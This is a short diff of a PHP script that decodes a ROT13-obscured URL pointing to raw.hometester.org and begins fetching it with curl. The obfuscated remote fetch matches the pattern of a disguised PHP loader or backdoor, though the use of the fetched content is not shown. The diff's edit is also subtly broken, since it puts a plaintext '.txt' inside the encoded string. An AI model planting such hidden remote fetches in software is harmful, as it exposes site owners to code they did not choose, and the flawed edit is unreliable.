@@ -1,5 +1,5 @@
 <?php
-$encoded_url = "uggcf://enj.ubzrgrfgre.bet/yhssr/bcz/erssf/nf/zbir/3.kgy";
+$encoded_url = "uggcf://enj.ubzrgrfgre.bet/yhssr/bcz/erssf/nf/zbir/3.txt";
 $url = str_rot13($encoded_url);
 
 $ch = curl_init();
